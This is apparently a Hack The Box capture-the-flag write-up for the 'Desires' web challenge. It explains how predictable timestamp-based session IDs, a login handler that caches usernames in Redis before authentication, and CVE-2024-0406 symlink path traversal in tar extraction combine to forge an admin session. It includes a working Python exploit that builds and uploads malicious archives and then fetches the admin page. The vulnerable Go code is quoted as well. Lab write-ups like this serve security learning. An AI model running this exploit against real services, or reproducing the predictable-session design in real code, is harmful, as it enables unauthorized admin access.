## HTB Desires

> There is a web application which allows to upload archive files after registering and authentication. We are given a soure code of app along with configuration files.

Authentication flow:
1. User registers with username and password.
2. User authenticates with credentials
3. Session cookie is obtained. Cookie is created by hashing unix timestamp with SHA256, so it is predicatble.
4. Credentials data are saved in `/tmp/sessions/username/sessionID`

```go
sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
```
Upload:
1. User uploads archive file, which is saved as UUID.ext
2. File is saved in `./uploads/UUID.ext`
3. New directory is created with `0755` permissions in `./files/username`
4. UUID.ext is extracted to created directory.

Exploitation steps:
1. Since session ids are predictable we can generate e.g. 100 session ids for next 100s for non-existing user, e.g. attacker.

```py
session_ids = []
    current_time = int(time.time())
    for i in range(100):
        session_id = hashlib.sha256(str(int(current_time)+i).encode()).hexdigest()
        session_ids.append(session_id)
        print(f"[+] Session ID: {session_id}")
```

2. Non-existing user is essential, because with CVE-2024-0406 we can write new files, but we cannot overwrite them. So for existing user, we cant create /tmp/session/existingUser/UUID. However, existing user will be needed for uploading files.
3. Now we upload 100 tars to remote target, which will extract all tars to relevant path: `/tmp/session/attacker/session_id`. However, there is a trick, we are still not able to get `FLAG` in `/user/admin` even with good session ID, because remote target tests if username is in Redis, since `attacker` does not exist (wasn't registered), this check will fail resulting in `500 Internal Server Error`.
```go
func DesireIsEnigma(c *fiber.Ctx) error {
        user := c.Locals("user")
        if user == nil {
                return utils.ErrorResponse(c, "User not found", http.StatusForbidden)
        }

        userStruct, ok := user.(User)
        if !ok {
                return c.SendStatus(http.StatusInternalServerError)
        }
```
4. However, there is security flaw in LoginHandler, before verifying if user exists, `LoginHandler` invokes `PrepareSession()` which saves current username to Redis cache, **this allows us to create entry in Redis, which allows to bypass check in 3rd step.**

```go
func LoginHandler(c *fiber.Ctx) error {
        var credentials Credentials
        if err := c.BodyParser(&credentials); err != nil {
                return utils.ErrorResponse(c, err.Error(), http.StatusBadRequest)
        }

        sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))

        err := PrepareSession(sessionID, credentials.Username) // VULNERABILITY: BROKEN LOGIC

        if err != nil {
                return utils.ErrorResponse(c, "Error wrong!", http.StatusInternalServerError)
        }

        user, err := loginUser(credentials.Username, credentials.Password)
        if err != nil {
                return utils.ErrorResponse(c, "Invalid username or Password", http.StatusBadRequest)
        }
```

```go
func PrepareSession(sessionID string, username string) error {
        return utils.RedisClient.Set(username, sessionID, 0)
}
```

5. So, after uploading files with prepared session IDs, we are trying to login as `attacker`, of course this will fail in authentication, since that user doesn't exist, but as mentioned in 4th step, we are able to save that username to cache, bypassing check in 3rd step. Finally we can invoke `user/admin` with generated session IDs.

```python
if __name__ == "__main__":
    # generate sessiond ids for next 100 seconds
    session_ids = []
    current_time = int(time.time())
    for i in range(100):
        session_id = hashlib.sha256(str(int(current_time)+i).encode()).hexdigest()
        session_ids.append(session_id)
        print(f"[+] Session ID: {session_id}")

    for session_id in session_ids:
        exploit = SymlinkArchiveExploit(
            target_path=f"/tmp/sessions/",  # Target directory for Path Traversal eg. /tmp/sessions in this case
            payload_data='{"username":"admin","id":3,"role":"admin"}',  # Value of the data to be written for eg. a json session json to gain admin role
            symlink_name=f"{session_id}",
            session_id=f"{session_id}",
            archive_name="malicious.tar"
        )

        if exploit.create_malicious_archive():
            # Example upload configuration
            exploit.upload_archive(
                upload_url="http://83.136.252.13:30585/user/upload",
                cookies={"username":"test", "session": "9d6c316dd90c2d89f5c5de4d9fd529300dd57125b6eac5b423012e8632f61b49"},  # Add session cookies if needed
            )

    # attempt to login as admin
    response = requests.post(
        "http://83.136.252.13:30585/login",
        data={"username": "admin", "password": "admin"}
    )
    print(response.text)

    for session_id in session_ids:
        rsp = requests.get(
            "http://83.136.252.13:30585/user/admin",
            cookies={"session": session_id, "username":"admin"}  # Use the session ID from the payload
        )
        print(rsp.text)
```

Created exploit is based on public available POC of CVE-2024-0406: `https://github.com/walidpyh/CVE-2024-0406-POC`.

To sum up, we leveraged three vulnerabilities here:
1. Predicatble session ids
2. Broken authentication logic (saving username to Redis before authentication)
3. CVE-2024-0406 - Path traversal through symlinks
